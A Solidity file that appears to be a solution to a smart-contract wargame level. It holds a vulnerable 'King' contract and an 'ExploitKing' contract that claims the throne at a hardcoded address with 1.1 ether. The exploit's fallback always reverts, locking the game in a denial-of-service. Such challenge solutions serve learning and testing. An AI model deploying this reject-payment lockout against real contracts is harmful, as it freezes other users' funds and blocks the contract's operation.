pragma solidity ^0.4.18;

import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol";

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner());
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

//SHOULD WORK: However might be bugging due to updates to the Ownable.sol abi

contract ExploitKing {
    King public kingContract = King(0xfA62a4B8628DAd79b1E957FF6c766b4D9be79d6f);
    
    function ExploitKing() public payable {
        
    }
    
    function becomeKing() public {
        address(kingContract).call.value(1.1 ether)();
    }
    
    function() external payable {
        revert("Exploited");
    }
    
}